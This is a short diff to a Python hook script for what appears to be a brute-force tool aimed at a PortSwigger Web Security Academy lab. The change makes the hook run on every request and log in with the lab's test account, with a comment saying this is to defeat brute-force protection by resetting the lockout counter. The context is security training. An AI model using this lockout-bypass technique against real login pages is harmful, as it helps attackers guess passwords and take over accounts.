@@ -11,24 +11,21 @@ I have access to data which follows the structure:
 import requests
 from typing import Dict, Any
 
-
 def condition(data: Dict[str, Any]) -> bool:
     """
     Optional: Return True if the script should execute for this response
     If not defined, the script will execute for all responses
     """
-    # Example: Only run for responses with status code 200
-    return response.get('code') == 200
+    # Example: Run every request
+    return True
 
 def execute(data: Dict[str, Any]):
     """
     Main execution function that runs after each request
     """
-    # Example: Print interesting responses
-    if response.get('chars', 0) > 1000:
-        print(f"Large response detected for {request_data['candidate_char']}")
-    
-    # Example: Save successful guesses
-    if response.get('show_response', False):
-        with open('successful_guesses.txt', 'a') as f:
-            f.write(f"{request_data['candidate_string']}\n")
+    # Login to defeat bruteforce protection
+    credentials = {
+        'username': 'wiener',
+        'password': 'peter'
+    }
+    response = requests.post('https://0a3100ff0382720182647ef4006100c2.web-security-academy.net/login', data=credentials)
